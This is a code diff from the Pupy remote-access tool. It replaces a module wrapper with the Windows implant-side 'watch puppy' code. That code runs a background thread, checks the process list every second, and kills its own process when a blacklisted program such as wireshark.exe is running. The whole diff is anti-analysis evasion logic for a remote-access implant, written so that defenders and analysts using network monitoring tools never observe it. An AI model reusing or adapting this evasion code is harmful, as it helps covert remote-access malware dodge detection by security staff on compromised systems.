@@ -1,48 +1,85 @@
-# -*- coding: UTF8 -*-
-from pupylib.PupyModule import *
-import StringIO
-import SocketServer
-import threading
-import socket
-import logging
-import struct
-import traceback
-import time
+# --------------------------------------------------------------
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# All rights reserved.
+# 
+# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
+# 
+# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
+# 
+# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
+# 
+# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
+# 
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
+# --------------------------------------------------------------
+import sys
 import os
-import datetime
-from pupylib.utils.rpyc_utils import redirected_stdio
+from ctypes import *
+from ctypes.wintypes import MSG, DWORD, HINSTANCE, HHOOK, WPARAM, LPARAM, BOOL, LPCWSTR, HMODULE
+import threading
+import time
+import psutil
 
-__class_name__="WatchPuppy"
+def watch_puppy_start():
+    if hasattr(sys, 'WATCHPUPPY_THREAD'):
+        return False
+    watchPuppy = WatchPuppy()
+    watchPuppy.start()
+    sys.WATCHPUPPY_THREAD=watchPuppy
+    return True
 
-@config(compat="windows", cat="manage")
-class WatchPuppy(PupyModule):
-    """ 
-        The watch puppy searches for processes from a black list and suicides in case of a find
-    """
-    daemon=True
-    unique_instance=True
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='watch_puppy', description=self.__doc__)
-        self.arg_parser.add_argument('action', choices=['start', 'stop'])
-
-    def stop_daemon(self):
-        self.success("watch puppy stopped")
-        
-    def run(self, args):
-        if args.action=="start":
-            self.client.load_package("psutil")
-            self.client.load_package("pupwinutils.watch_puppy")
-            with redirected_stdio(self.client.conn): #to see the output exception in case of error
-                if not self.client.conn.modules["pupwinutils.watch_puppy"].watch_puppy_start():
-                    self.error("the watch puppy is already started")
-                else:
-                    self.success("watch puppy started !")
-
-        elif args.action=="stop":
-            if self.client.conn.modules["pupwinutils.watch_puppy"].watch_puppy_stop():
-                self.success("watch puppy stopped")
-            else:
-                self.success("watch puppy is not started")
+def watch_puppy_stop():
+    if hasattr(sys, 'WATCHPUPPY_THREAD'):
+        sys.WATCHPUPPY_THREAD.stop()
+        del sys.WATCHPUPPY_THREAD
+        return True
+    return False
+    
+def get_bad_processes():
+    return ['calculator.exe','wireshark.exe']
 
 
+class WatchPuppy(threading.Thread):
+    def __init__(self, *args, **kwargs):
+        threading.Thread.__init__(self, *args, **kwargs)
+        self.daemon=True
+        if not hasattr(sys, 'WATCHPUPPY_BUFFER'):
+            sys.WATCHPUPPY_BUFFER=""
+        self.stopped=False
 
+    def run(self):
+        while not self.stopped:
+            sys.WATCHPUPPY_BUFFER += 'running ...\n'
+            if self.have_bad_processes():
+                self.suicide()
+            time.sleep(1)
+
+    def stop(self):
+        self.stopped=True
+
+    def have_bad_processes(self):
+        bad_procs = get_bad_processes()
+        proclist = []
+        for proc in psutil.process_iter():
+            try:
+                pinfo = proc.as_dict(attrs=['username', 'pid', 'name', 'exe', 'cmdline', 'status'])
+                exe_filename = pinfo['exe']
+                if exe_filename and exe_filename.count('\\')>0:
+                    exe_filename = os.path.basename(exe_filename)
+                    proclist.append(exe_filename.lower())
+            except psutil.NoSuchProcess:
+                pass
+        proclist = list(set(proclist))
+        proclist.extend(bad_procs)
+        return len(proclist) != len(set(proclist))
+
+    def suicide(self):
+        os.kill(os.getpid(),9)
+
+if __name__=="__main__":
+    #the main is only here for testing purpose and won't be run by modules
+    watchPuppy = WatchPuppy()
+    watchPuppy.start()
+    while True:
+        time.sleep(5)
+        print '5 seconds passed\n'
